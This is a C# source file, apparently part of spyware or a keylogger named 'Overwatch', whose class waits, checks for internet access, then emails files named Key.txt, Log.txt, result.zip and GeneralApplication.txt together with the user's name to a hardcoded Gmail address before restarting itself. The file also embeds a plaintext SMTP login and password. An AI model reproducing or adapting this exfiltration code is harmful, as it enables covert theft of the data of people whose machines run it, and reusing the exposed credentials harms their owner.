using System;
using System.Net;
using System.Net.Mail;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace Overwatch
{
    class cSendingInformation
    {
        static appLog Log = new appLog();
        public void Sending() 
        {
            try
            {
                while (true)
                {
                    System.Threading.Thread.Sleep(8000000);
                    
                    if (ConnectivityChecker.CheckInternet() == true)
                    {
                        cThread.sending = true;
                        System.Threading.Thread.Sleep(60000);
                        using (MailMessage mail = new MailMessage())
                        {
                            mail.From = new MailAddress("isthechastener@gmail.com");
                            mail.To.Add("satiriorn@gmail.com");
                            mail.Subject = "INFORMATION";
                            mail.Body = String.Format("<h1>{0}</h1>", cReceiveInformation.UsersName);
                            mail.IsBodyHtml = true;
                            cReceiveInformation.CompressionFile();
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\result.zip"));
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\GeneralApplication.txt"));
                            using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                            {
                                smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
                                smtp.EnableSsl = true;
                                smtp.Send(mail);
                            }
                        }
                        cThread.sending = false;
                        cReceiveInformation.DeleteFile(appConfing.targetDirPath + "\\result.zip");
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                    }
                }
            }
            catch (Exception ex) {
                Log.Write(ex.Message, true);
                Process.Start(Assembly.GetExecutingAssembly().Location);
                Environment.Exit(0);
            }
        }
    }
    public static class ConnectivityChecker
    {
        public delegate void Response();
        public static bool CheckInternet()
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry("dns.msftncsi.com");
                if (entry.AddressList.Length == 0)
                    return false;
                else
                    if (!entry.AddressList[0].ToString().Equals("131.107.255.255"))
                        return true;
            }
            catch { return false;}

            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://www.msftncsi.com/ncsi.txt");
            try
            {
                HttpWebResponse responce = (HttpWebResponse)request.GetResponse();

                if (responce.StatusCode != HttpStatusCode.OK)
                    return true;
                using (StreamReader sr = new StreamReader(responce.GetResponseStream()))
                {
                    return sr.ReadToEnd().Equals("Microsoft NCSI") ? true : true;
                }
            }
            catch{ return false;}
        }
    }
}
